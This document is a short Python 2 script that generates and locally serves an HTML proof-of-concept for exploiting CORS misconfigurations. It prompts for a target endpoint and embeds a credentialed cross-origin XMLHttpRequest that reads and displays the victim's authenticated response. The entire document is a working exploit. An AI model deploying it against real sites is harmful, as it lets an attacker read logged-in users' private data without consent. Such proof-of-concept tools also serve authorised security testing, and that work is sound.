import os
end_point=raw_input("End_point_url>>>")
html="""
<!DOCTYPE html>
<html>
<body>
<center>
<h2>C0RS P0C Expl0it</h2>
<h3>Extract Information</h3>
 
<div id="info">
<button type="button" onclick="cors()">Exploit</button>
</div>
 
<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("info").innerHTML = alert(this.responseText);
    }
  };
  xhttp.open("GET","%s", true);"""%end_point+"""
  xhttp.withCredentials = true;
  xhttp.send();
}
</script>
 
</body>
</html>
"""
f=open("cors.html","w")
f.write(html)
f.close()
print "Serving cors_poc at url: http://localhost:8000/cors.html"
os.system("python -m SimpleHTTPServer 8000")


